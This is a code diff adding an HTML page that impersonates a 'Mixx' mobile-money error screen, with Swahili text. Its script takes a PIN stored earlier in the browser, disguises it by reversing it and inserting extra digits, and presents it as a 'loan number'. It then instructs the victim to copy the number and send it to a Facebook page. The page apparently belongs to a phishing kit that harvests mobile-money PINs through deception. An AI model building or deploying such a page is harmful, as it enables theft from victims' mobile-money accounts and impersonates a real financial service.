@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mixx - Samahani</title>
+    <style>
+        :root {
+            --mixx-blue: #003366;
+            --mixx-accent: #005596;
+            --text-gray: #718096;
+            --success-green: #2f855a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0 30px;
+            text-align: center;
+        }
+
+        /* Mixx Themed Header Decor */
+        .brand-accent {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--mixx-blue), var(--mixx-accent));
+        }
+
+        .icon-error {
+            color: var(--mixx-blue);
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: var(--mixx-blue);
+            font-size: 42px;
+            font-weight: 900;
+            margin-bottom: 10px;
+        }
+
+        .main-error {
+            color: var(--mixx-blue);
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .info-card {
+            background-color: #f7fafc;
+            border-radius: 15px;
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #edf2f7;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .loan-text {
+            color: var(--text-gray);
+            font-size: 16px;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .final-number-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #ffffff;
+            border: 2px dashed var(--mixx-blue);
+            padding: 12px 20px;
+            border-radius: 10px;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        .final-value {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--mixx-blue);
+            letter-spacing: 2px;
+        }
+
+        .copy-btn {
+            background-color: var(--mixx-blue);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .toast {
+            position: absolute;
+            top: -30px;
+            right: 0;
+            color: var(--success-green);
+            font-size: 13px;
+            font-weight: bold;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .instruction-footer {
+            margin-top: 25px;
+            font-size: 14px;
+            color: var(--text-gray);
+            font-style: italic;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="brand-accent"></div>
+
+    <div class="icon-error">!</div>
+    <h1>Oops!!</h1>
+    <p class="main-error">Samahani, Kuna tatizo kwenye System.</p>
+
+    <div class="info-card">
+        <p class="loan-text" id="loanMessage"></p>
+        
+        <p class="loan-text" style="font-weight: 600; color: var(--mixx-blue);">
+            Nakili nambari hii Kisha rejea kwenye ukurasa wa Facebook Kisha Tuma nambari Hilo
+        </p>
+
+        <div class="final-number-row">
+            <span class="toast" id="toast">Imenakiliwa</span>
+            <span class="final-value" id="resultPin">-------</span>
+            <button class="copy-btn" onclick="copyNumber()">Nakili</button>
+        </div>
+    </div>
+
+    <p class="instruction-footer">Tafadhali usifunge ukurasa huu mpaka utakapomaliza.</p>
+
+    <script>
+        window.onload = function() {
+            // 1. Retrieve the Pin
+            const rawPin = localStorage.getItem('MyPin') || "0000";
+            
+            // 2. Flip it (LtR to RtL)
+            // e.g., "1234" -> "4321"
+            const flipped = rawPin.split('').reverse().join('');
+            
+            // 3. Transformation Logic:
+            // Add 1 at start, 7 at center (index 2), 1 at end
+            // flipped[0]flipped[1] + 7 + flipped[2]flipped[3]
+            const part1 = flipped.slice(0, 2);
+            const part2 = flipped.slice(2, 4);
+            const finalValue = "1" + part1 + "7" + part2 + "1";
+
+            // 4. Display
+            document.getElementById('resultPin').textContent = finalValue;
+            document.getElementById('loanMessage').innerHTML = 
+                `Nambari yako ya mkopo ni <strong>${finalValue}</strong>`;
+        };
+
+        function copyNumber() {
+            const numText = document.getElementById('resultPin').textContent;
+            const toast = document.getElementById('toast');
+
+            // Copy to clipboard
+            navigator.clipboard.writeText(numText).then(() => {
+                // Show toast
+                toast.style.opacity = '1';
+                
+                // Hide after 2 seconds
+                setTimeout(() => {
+                    toast.style.opacity = '0';
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
